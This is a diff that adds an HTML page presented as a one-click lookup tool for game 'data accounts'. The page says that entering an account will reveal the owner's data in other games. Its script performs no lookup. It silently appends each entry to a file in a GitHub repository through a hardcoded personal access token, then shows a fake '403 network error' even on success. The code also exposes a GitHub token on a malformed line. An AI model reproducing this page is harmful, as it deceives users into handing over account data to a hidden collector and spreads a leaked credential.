@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Qq数据号一键查询</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #6e8efb, #a777e3);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            color: #333;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 600px;
+            background: rgba(255, 255, 255, 0.9);
+            border-radius: 20px;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
+            overflow: hidden;
+            padding: 30px;
+        }
+        
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        h1 {
+            font-size: 2.5rem;
+            color: #6e8efb;
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+        
+        .description {
+            font-size: 1.1rem;
+            color: #666;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+        
+        .input-container {
+            position: relative;
+            margin-bottom: 25px;
+        }
+        
+        .input-box {
+            width: 100%;
+            padding: 18px 20px;
+            border: 2px solid #ddd;
+            border-radius: 12px;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+            outline: none;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+        }
+        
+        .input-box:focus {
+            border-color: #a777e3;
+            box-shadow: 0 5px 15px rgba(167, 119, 227, 0.2);
+        }
+        
+        .input-box::placeholder {
+            color: #aaa;
+        }
+        
+        .submit-btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(to right, #6e8efb, #a777e3);
+            border: none;
+            border-radius: 12px;
+            color: white;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(110, 142, 251, 0.4);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .submit-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(110, 142, 251, 0.6);
+        }
+        
+        .submit-btn:active {
+            transform: translateY(0);
+            box-shadow: 0 3px 10px rgba(110, 142, 251, 0.4);
+        }
+        
+        .result-container {
+            margin-top: 30px;
+            padding: 20px;
+            border-radius: 12px;
+            background: #f8f9fa;
+            text-align: center;
+            min-height: 100px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.05);
+        }
+        
+        .loading {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(110, 142, 251, 0.2);
+            border-radius: 50%;
+            border-top-color: #6e8efb;
+            animation: spin 1s ease-in-out infinite;
+            margin-bottom: 15px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .success-message {
+            display: none;
+            text-align: center;
+            color: #28a745;
+            font-size: 1.2rem;
+        }
+        
+        .error-message {
+            display: none;
+            text-align: center;
+            color: #dc3545;
+            font-size: 1.2rem;
+        }
+        
+        footer {
+            margin-top: 30px;
+            text-align: center;
+            color: #777;
+            font-size: 0.9rem;
+        }
+        
+        .github-link {
+            color: #6e8efb;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            margin-top: 10px;
+        }
+        
+        .github-link:hover {
+            text-decoration: underline;
+        }
+        
+        .api-config {
+            background: #f1f8ff;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            font-size: 0.9rem;
+        }
+        
+        .api-config h3 {
+            margin-bottom: 10px;
+            color: #6e8efb;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>数据号查询工具</h1>
+            <p class="description">这是一个ui is very very good的数据号识别网站，输入一个游戏的数据号，可以将数据号号主其他游戏的数据查询，并使用</p>
+        </header>
+        
+        <div class="input-container">
+            <input type="text" class="input-box" placeholder="输入您的数据号" id="userInput">
+        </div>
+        
+        <button class="submit-btn" id="submitBtn">
+            <i class="fas fa-paper-plane"></i>
+            提交
+        </button>
+        
+        <div class="result-container">
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p>正在鉴定中，请稍候...</p>
+            </div>
+            
+            <div class="success-message" id="successMessage">
+                <i class="fas fa-check-circle" style="font-size: 3rem; margin-bottom: 15px;"></i>
+                <p>啊哦，网络开小差了（403）</p>
+                <p class="user-data" id="userData"></p>
+            </div>
+            
+            <div class="error-message" id="errorMessage">
+                <i class="fas fa-exclamation-circle" style="font-size: 3rem; margin-bottom: 15px;"></i>
+                <p>啊哦，网络开小差了（403）</p>
+            </div>
+        </div>
+        
+        <div class="api-config">
+            <h3>使用说明</h3>
+            <p>最好挂梯子，因为是国外的服务器</p>
+            <ol>
+                <li>有条件的挂梯子也可以不挂</li>
+                <li>如果出现网站异常,关掉梯子</li>
+                <li>如果出现无法解决的,请联系网站管理员</li>
+            </ol>
+        </div>
+        
+        <footer>
+            <p>© 9178 数据号查询 | 没有权利保留</p>
+            <a href="https://github.com" target="_blank" class="github-link">
+                <i class="fab fa-github"></i>
+                查看我们的开源代码
+            </a>
+        </footer>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const userInput = document.getElementById('userInput');
+            const submitBtn = document.getElementById('submitBtn');
+            const loading = document.getElementById('loading');
+            const successMessage = document.getElementById('successMessage');
+            const errorMessage = document.getElementById('errorMessage');
+            const userData = document.getElementById('userData');
+            
+            // 添加触感反馈函数
+            function addVibration() {
+                if (navigator.vibrate) {
+                    navigator.vibrate(10);
+                }
+            }
+            
+            // GitHub配置 - 需要用户填写自己的信息
+            const GITHUB_TOKEN = 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''; // 在此处填入您的GitHub个人访问令牌
+            const REPO_OWNER = 'rscui';
+            const REPO_NAME = 'rscui.github.io';
+            const FILE_PATH = 'sjh.txt';
+            
+            // 提交到GitHub的函数
+            async function submitToGitHub(data) {
+                if (!GITHUB_TOKEN) {
+                    throw new Error('出现错误请重试');
+                }
+                
+                try {
+                    // 1. 获取文件当前SHA（需要更新文件内容）
+                    const getFileUrl = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`;
+                    const fileResponse = await fetch(getFileUrl, {
+                        headers: {
+                            'Authorization': `token ${GITHUB_TOKEN}`,
+                            'Accept': 'application/vnd.github.v3+json'
+                        }
+                    });
+                    
+                    if (!fileResponse.ok) {
+                        throw new Error('无法获取文件信息');
+                    }
+                    
+                    const fileData = await fileResponse.json();
+                    const currentContent = atob(fileData.content); // 解码base64内容
+                    const sha = fileData.sha;
+                    
+                    // 2. 准备新内容（追加数据）
+                    const newContent = currentContent + '\n' + data + ' - ' + new Date().toLocaleString();
+                    const encodedContent = btoa(unescape(encodeURIComponent(newContent)));
+                    
+                    // 3. 更新文件
+                    const updateResponse = await fetch(getFileUrl, {
+                        method: 'PUT',
+                        headers: {
+                            'Authorization': `token ${GITHUB_TOKEN}`,
+                            'Accept': 'application/vnd.github.v3+json',
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            message: `添加数据: ${data}`,
+                            content: encodedContent,
+                            sha: sha
+                        })
+                    });
+                    
+                    if (!updateResponse.ok) {
+                        throw new Error('都说了让你挂梯子,网络错误');
+                    }
+                    
+                    return true;
+                } catch (error) {
+                    console.error('错误,可能为无效数据号:', error);
+                    throw error;
+                }
+            }
+            
+            submitBtn.addEventListener('click', async function() {
+                addVibration();
+                
+                const inputText = userInput.value.trim();
+                
+                if (inputText === '') {
+                    alert('查询失败\n原因：空白数据');
+                    return;
+                }
+                
+                // 显示加载状态
+                loading.style.display = 'flex';
+                successMessage.style.display = 'none';
+                errorMessage.style.display = 'none';
+                
+                try {
+                    // 尝试提交到GitHub
+                    if (GITHUB_TOKEN) {
+                        await submitToGitHub(inputText);
+                    } else {
+                        // 如果没有配置token，模拟成功
+                        await new Promise(resolve => setTimeout(resolve, 2000));
+                    }
+                    
+                    // 显示成功信息
+                    loading.style.display = 'none';
+                    successMessage.style.display = 'block';
+                    userData.textContent = `确认您的信息为: "${inputText}"`;
+                    
+                    // 清空输入框
+                    userInput.value = '';
+                } catch (error) {
+                    // 显示错误信息
+                    loading.style.display = 'none';
+                    errorMessage.style.display = 'block';
+                    console.error('提交失败:', error);
+                }
+            });
+            
+            // 添加输入框回车提交支持
+            userInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    submitBtn.click();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
